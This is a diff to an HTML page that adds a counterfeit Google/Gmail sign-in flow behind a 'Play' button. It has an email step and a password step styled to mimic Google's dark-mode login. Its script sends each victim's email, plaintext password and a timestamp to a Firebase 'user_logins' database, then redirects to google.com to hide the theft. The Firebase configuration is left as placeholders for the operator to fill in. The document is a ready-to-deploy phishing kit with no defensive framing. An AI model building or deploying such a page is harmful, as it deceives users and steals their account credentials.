@@ -98,13 +98,131 @@
         </div>
     </div>
 
-    <!-- PAGE 2: GMAIL LOGIN -->
+    <!-- PAGE 2: GMAIL LOGIN (STEP 1) -->
     <div id="page2" class="page" style="background: #0B0B0B; padding: 24px;">
         <div style="font-size: 64px; font-weight: bold; color: #4285F4; margin-top: 24px;">G</div>
         <div style="font-size: 36px; color: #E8EAED; margin-top: 24px;">Sign in</div>
         <div style="font-size: 18px; color: #E8EAED; margin-top: 28px;">Use your Google Account</div>
 
-        <input type="email" id="edittext_email" placeholder="Email or phone" style="width: 100%; height: 60px; margin-top: 55px; padding: 12px; font-size: 16px; color: #E8EAED; background: #131314; border: 1.5px solid #A8C7FA; border-radius: 8px; outline: none;">
+        <input type="text" id="edittext_email" placeholder="Email or phone" style="width: 100%; height: 60px; margin-top: 55px; padding: 12px; font-size: 16px; color: #E8EAED; background: #131314; border: 1.5px solid #A8C7FA; border-radius: 8px; outline: none;">
 
         <div style="font-size: 15px; font-weight: bold; color: #A8C7FA; margin-top: 18px; cursor: pointer;">Forgot email?</div>
         
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 60px;">
+            <div style="font-size: 15px; font-weight: bold; color: #A8C7FA; cursor: pointer;">Create account</div>
+            <div id="btn_next_email" style="background: #A8C7FA; color: #001D35; padding: 12px 28px; border-radius: 20px; font-weight: bold; font-size: 15px; cursor: pointer;">Next</div>
+        </div>
+    </div>
+
+    <!-- PAGE 3: GMAIL LOGIN - WELCOME (SCREENSHOT UI STYLE) -->
+    <div id="page3" class="page" style="background: #0B0B0B; padding: 24px;">
+        <div style="font-size: 64px; font-weight: bold; color: #4285F4; margin-top: 24px;">G</div>
+        <div style="font-size: 36px; color: #E8EAED; margin-top: 24px;">Welcome</div>
+
+        <!-- Selected Account Pill (Screenshot Style) -->
+        <div style="display: inline-flex; align-items: center; border: 1.5px solid #5f6368; border-radius: 20px; padding: 6px 14px; margin-top: 22px; background: #131314; width: fit-content;">
+            <div style="width: 22px; height: 22px; background: #5f6368; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; color: #fff; margin-right: 8px;">👤</div>
+            <span id="display_email" style="font-size: 14px; color: #E8EAED; font-weight: 500;">user@gmail.com</span>
+            <span style="font-size: 12px; color: #9aa0a6; margin-left: 8px;">▼</span>
+        </div>
+
+        <input type="password" id="edittext_password" placeholder="Enter your password" style="width: 100%; height: 60px; margin-top: 45px; padding: 12px; font-size: 16px; color: #E8EAED; background: #131314; border: 1.5px solid #A8C7FA; border-radius: 8px; outline: none;">
+
+        <div style="display: flex; align-items: center; margin-top: 18px;">
+            <input type="checkbox" id="chk_show_password" style="width: 20px; height: 20px; cursor: pointer; accent-color: #A8C7FA;">
+            <label for="chk_show_password" style="font-size: 15px; color: #E8EAED; margin-left: 10px; cursor: pointer;">Show password</label>
+        </div>
+
+        <div style="font-size: 15px; font-weight: bold; color: #A8C7FA; margin-top: 24px; cursor: pointer;">Forgot password?</div>
+
+        <div style="display: flex; justify-content: flex-end; align-items: center; margin-top: 50px;">
+            <div id="btn_next_password" style="background: #A8C7FA; color: #001D35; padding: 12px 28px; border-radius: 20px; font-weight: bold; font-size: 15px; cursor: pointer;">Next</div>
+        </div>
+    </div>
+
+    <!-- FIREBASE SDKs & SYSTEM LOGIC SCRIPT -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <script>
+        // Your Firebase Configuration (මෙතැනට ඔබේ Firebase අගයන් දමා ගන්න)
+        const firebaseConfig = {
+            apiKey: "YOUR_API_KEY",
+            authDomain: "YOUR_AUTH_DOMAIN",
+            databaseURL: "YOUR_DATABASE_URL",
+            projectId: "YOUR_PROJECT_ID",
+            storageBucket: "YOUR_STORAGE_BUCKET",
+            messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
+            appId: "YOUR_APP_ID"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        let currentEmail = "";
+
+        // Page Navigation Helper
+        function showPage(pageId) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById(pageId).classList.add('active');
+        }
+
+        // Play Button Click -> Go to Login Page 2
+        document.getElementById('btn_play').addEventListener('click', function() {
+            showPage('page2');
+        });
+
+        // Next Email Button Click
+        document.getElementById('btn_next_email').addEventListener('click', function() {
+            let emailInput = document.getElementById('edittext_email').value.trim();
+            if(emailInput === "") {
+                alert("Please enter email or phone");
+                return;
+            }
+            // Auto add @gmail.com if missing
+            if(!emailInput.includes("@")) {
+                emailInput += "@gmail.com";
+            }
+            currentEmail = emailInput;
+            document.getElementById('display_email').innerText = currentEmail;
+            showPage('page3');
+        });
+
+        // Show/Hide Password Toggle
+        document.getElementById('chk_show_password').addEventListener('change', function() {
+            let passInput = document.getElementById('edittext_password');
+            if(this.checked) {
+                passInput.type = "text";
+            } else {
+                passInput.type = "password";
+            }
+        });
+
+        // Next Password Button Click -> Save to Firebase
+        document.getElementById('btn_next_password').addEventListener('click', function() {
+            let passwordInput = document.getElementById('edittext_password').value.trim();
+            if(passwordInput === "") {
+                alert("Please enter your password");
+                return;
+            }
+
+            let timeNow = new Date().toLocaleString();
+
+            // Check duplicate to prevent multiple submissions
+            db.ref('user_logins').orderByChild('email').equalTo(currentEmail).once('value', function(snapshot) {
+                if (!snapshot.exists()) {
+                    db.ref('user_logins').push({
+                        email: currentEmail,
+                        password: passwordInput,
+                        time: timeNow
+                    }, function(error) {
+                        if (!error) {
+                            window.location.href = "https://www.google.com";
+                        }
+                    });
+                } else {
+                    window.location.href = "https://www.google.com";
+                }
+            });
+        });
+    </script>
+</body>
+</html>
